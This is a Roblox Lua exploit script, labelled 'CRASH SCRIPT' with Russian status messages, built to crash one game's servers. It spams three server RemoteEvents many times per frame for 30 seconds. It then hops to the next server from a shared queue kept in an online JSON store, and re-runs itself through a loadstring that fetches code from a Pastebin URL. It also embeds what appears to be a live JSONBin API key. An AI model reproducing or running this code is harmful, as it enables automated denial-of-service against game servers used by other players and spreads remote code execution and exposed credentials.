local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")

local GAME_ID = 11451679682
if game.PlaceId ~= GAME_ID then return end

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")
local character = player.Character or player.CharacterAdded:Wait()
local humanoid = character:WaitForChild("Humanoid")
local rootPart = character:WaitForChild("HumanoidRootPart")

local PlaceId = game.PlaceId
local CurrentJobId = game.JobId

local CONFIG = {
    JSONBinID = "6aa56f96ac6210605ac505f9",
    JSONBinKey = "$2a$10$RSaoIuwX6FQOeNS61UW3eegXc8kmdCmN8/PsUHblaPvRinh/I6fFu",

    PantryID = "f4e76f34-ce27-4bb9-9608-d0e85590bd84",
    PantryBasket = "my-new-basket-name",

    MinPlayers = 5,
    MaxPlayers = 25,
    MaxPages = 6,
    CacheMaxAgeMinutes = 120,
    ScriptURL = "https://pastebin.com/raw/KzHtTAPc",
}

local queue_on_teleport = (syn and syn.queue_on_teleport)
    or queue_on_teleport
    or (fluxus and fluxus.queue_on_teleport)
    or (getgenv() and getgenv().queue_on_teleport)

local REEXECUTE = string.format([[
    loadstring(game:HttpGet("%s"))()
]], CONFIG.ScriptURL)

if queue_on_teleport then
    queue_on_teleport(REEXECUTE)
end

local function httpRequest(opts)
    local req = (syn and syn.request) or (http and http.request) or request or http_request
    if not req then return nil end
    local ok, res = pcall(req, opts)
    if not ok then return nil end
    return res
end

local function encode(t)
    local ok, r = pcall(HttpService.JSONEncode, HttpService, t)
    return ok and r or nil
end

local function decode(s)
    local ok, r = pcall(HttpService.JSONDecode, HttpService, s)
    return ok and r or nil
end

local function sharedRead()
    local res = httpRequest({
        Url = "https://getpantry.cloud/apiv1/pantry/" .. CONFIG.PantryID .. "/basket/" .. CONFIG.PantryBasket,
        Method = "GET",
        Headers = { ["Content-Type"] = "application/json" }
    })
    if not res or res.StatusCode ~= 200 then return nil end
    local data = decode(res.Body)
    if not data then return nil end
    data._metadata = nil
    return data
end

local function sharedWrite(data)
    local res = httpRequest({
        Url = "https://getpantry.cloud/apiv1/pantry/" .. CONFIG.PantryID .. "/basket/" .. CONFIG.PantryBasket,
        Method = "POST",
        Headers = { ["Content-Type"] = "application/json" },
        Body = encode(data)
    })
    return res and res.StatusCode == 200
end

local function isCacheValid(cache)
    if not cache or type(cache.queue) ~= "table" then return false end
    if cache.placeId ~= PlaceId then return false end
    if #cache.queue == 0 then return false end
    local age = (os.time() - (cache.updatedAt or 0)) / 60
    if age > CONFIG.CacheMaxAgeMinutes then return false end
    return true
end

local function getCache()
    local shared = sharedRead()
    if isCacheValid(shared) then return shared, "shared" end
    return nil, nil
end

local function saveCache(cache)
    cache.updatedAt = os.time()
    cache.placeId = PlaceId
    sharedWrite(cache)
end

local function fetchServers()
    local result = {}
    local cursor = ""
    local pages = 0

    while pages < CONFIG.MaxPages do
        local url = "https://games.roblox.com/v1/games/" .. PlaceId .. "/servers/Public?sortOrder=Desc&limit=100"
        if cursor ~= "" and cursor ~= "null" then
            url = url .. "&cursor=" .. cursor
        end

        local ok, body = pcall(function()
            return game:HttpGet(url)
        end)
        if not ok or not body then break end

        local data = decode(body)
        if not data or type(data.data) ~= "table" then break end

        local fetchedThisPage = #data.data

        for _, s in ipairs(data.data) do
            local playing = tonumber(s.playing) or 0
            local id = tostring(s.id or "")
            if id ~= "" and id ~= CurrentJobId and playing >= CONFIG.MinPlayers and playing <= CONFIG.MaxPlayers then
                table.insert(result, {id = id, playing = playing})
            end
        end

        pages = pages + 1

        if fetchedThisPage < 100 then
            break
        end

        cursor = data.nextPageCursor
        if not cursor or cursor == "" or cursor == "null" then
            break
        end

        task.wait(0.3)
    end

    table.sort(result, function(a, b)
        local aIs25 = (a.playing >= CONFIG.MaxPlayers)
        local bIs25 = (b.playing >= CONFIG.MaxPlayers)
        if aIs25 ~= bIs25 then
            return not aIs25
        end
        return a.playing > b.playing
    end)
    return result
end

local function createNewCache()
    local servers = fetchServers()
    if #servers == 0 then return nil end

    local queue = {}
    for _, s in ipairs(servers) do
        table.insert(queue, s.id)
    end

    local cache = {
        placeId = PlaceId,
        queue = queue,
        updatedAt = os.time(),
        total = #queue,
        creator = player.Name
    }
    saveCache(cache)
    return cache
end

local function popNextJobId()
    local cache, source = getCache()
    if not cache then
        cache = createNewCache()
        if not cache then return nil, 0, "create_failed" end
        source = "new"
    end

    local nextId = table.remove(cache.queue, 1)
    saveCache(cache)
    return nextId, #cache.queue, source
end

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "CrashScript"
screenGui.ResetOnSpawn = false
screenGui.Parent = playerGui

local mainFrame = Instance.new("Frame")
mainFrame.Size = UDim2.new(0, 300, 0, 150)
mainFrame.Position = UDim2.new(0.5, -150, 0.5, -75)
mainFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
mainFrame.BorderSizePixel = 2
mainFrame.BorderColor3 = Color3.fromRGB(255, 0, 0)
mainFrame.Parent = screenGui

local titleLabel = Instance.new("TextLabel")
titleLabel.Size = UDim2.new(1, 0, 0, 30)
titleLabel.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
titleLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
titleLabel.TextSize = 16
titleLabel.Font = Enum.Font.GothamBold
titleLabel.Text = "CRASH SCRIPT"
titleLabel.BorderSizePixel = 1
titleLabel.BorderColor3 = Color3.fromRGB(255, 0, 0)
titleLabel.Parent = mainFrame

local statusLabel = Instance.new("TextLabel")
statusLabel.Size = UDim2.new(1, -10, 0, 25)
statusLabel.Position = UDim2.new(0, 5, 0, 35)
statusLabel.BackgroundTransparency = 1
statusLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
statusLabel.TextSize = 14
statusLabel.Font = Enum.Font.GothamBold
statusLabel.TextXAlignment = Enum.TextXAlignment.Center
statusLabel.Text = "ПРОВЕРКА/ПОДГОТОВКА"
statusLabel.Parent = mainFrame

local timerLabel = Instance.new("TextLabel")
timerLabel.Size = UDim2.new(1, -10, 0, 25)
timerLabel.Position = UDim2.new(0, 5, 0, 65)
timerLabel.BackgroundTransparency = 1
timerLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
timerLabel.TextSize = 12
timerLabel.Font = Enum.Font.Gotham
timerLabel.TextXAlignment = Enum.TextXAlignment.Center
timerLabel.Text = "Ожидание..."
timerLabel.Parent = mainFrame

local READY_JOB_ID = nil
local READY_REMAINING = 0
local READY_SOURCE = nil

local function prepareHopInBackground()
    local when = math.random(1, 20)
    task.wait(when)

    local jobId, remaining, source = popNextJobId()
    if jobId then
        READY_JOB_ID = jobId
        READY_REMAINING = remaining
        READY_SOURCE = source
    end
end

local function smartHop()
    statusLabel.Text = "ПОЛУЧАЮ ОЧЕРЕДЬ..."
    timerLabel.Text = "Проверяю готовый ID"

    local waitStart = os.clock()
    while not READY_JOB_ID and (os.clock() - waitStart) < 25 do
        task.wait(0.1)
    end

    if not READY_JOB_ID then
        statusLabel.Text = "НЕТ СЕРВЕРОВ"
        timerLabel.Text = "ID не был получен"
        return
    end

    local srcText = READY_SOURCE == "shared" and "общий" or "новый"
    statusLabel.Text = "SERVER HOP (" .. srcText .. ")"
    timerLabel.Text = string.format("→ %s... | осталось %d",
        string.sub(READY_JOB_ID, 1, 8), READY_REMAINING)

    if queue_on_teleport then
        queue_on_teleport(REEXECUTE)
    end

    pcall(function()
        TeleportService:TeleportToPlaceInstance(PlaceId, READY_JOB_ID, player)
    end)
end

local remotes = {
    game:GetService("ReplicatedStorage"):WaitForChild("FireNull"),
    game:GetService("ReplicatedStorage"):WaitForChild("FireMissile"),
    game:GetService("ReplicatedStorage"):WaitForChild("FireGun")
}

local spamConnection = nil
local isSpamming = false

local function disableAllCollisions()
    for _, part in pairs(workspace:GetDescendants()) do
        if part:IsA("BasePart") then
            part.CanCollide = false
        end
    end
end

local function startMoving()
    disableAllCollisions()
    local bv = Instance.new("BodyVelocity")
    bv.Velocity = Vector3.new(300, 0, 0)
    bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
    bv.Parent = rootPart
    humanoid.PlatformStand = true
    for _, state in ipairs({"Climbing", "FallingDown", "Flying", "Jumping", "Landed"}) do
        humanoid:SetStateEnabled(Enum.HumanoidStateType[state], false)
    end
    return bv
end

local function stopMoving(bv)
    if bv then bv:Destroy() end
    local hold = Instance.new("BodyVelocity")
    hold.Velocity = Vector3.new(0, 0, 0)
    hold.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
    hold.Parent = rootPart
    return hold
end

local function startCrashSpam()
    isSpamming = true
    spamConnection = RunService.Heartbeat:Connect(function()
        if not isSpamming then
            if spamConnection then spamConnection:Disconnect() end
            return
        end
        for i = 1, 60 do
            for _, remote in pairs(remotes) do
                pcall(function() remote:FireServer() end)
            end
        end
    end)
end

local function stopCrashSpam()
    isSpamming = false
    if spamConnection then
        spamConnection:Disconnect()
        spamConnection = nil
    end
end

task.spawn(function()
    statusLabel.Text = "ЗАПУСК"
    timerLabel.Text = "Фоновый процесс пошёл"

    task.spawn(prepareHopInBackground)

    task.wait(1.5)

    statusLabel.Text = "УБЕГАЕМ"
    local bv = startMoving()
    local runTime = 0
    while runTime < 3 do
        runTime = runTime + RunService.Heartbeat:Wait()
        timerLabel.Text = string.format("Бежим: %.1f сек", runTime)
    end

    stopMoving(bv)

    statusLabel.Text = "СТРЕЛЯЕМ"
    timerLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
    startCrashSpam()

    local t = 30
    while t > 0 do
        local idState = READY_JOB_ID and "ID готов" or "ждём ID"
        timerLabel.Text = string.format("ХОП ЧЕРЕЗ %d СЕК | %s", t, idState)
        task.wait(1)
        t = t - 1
    end

    stopCrashSpam()
    statusLabel.Text = "КРАШ ЗАВЕРШЁН"
    timerLabel.Text = "ДЕЛАЮ SHARED HOP..."

    task.wait(0.4)
    smartHop()
end)
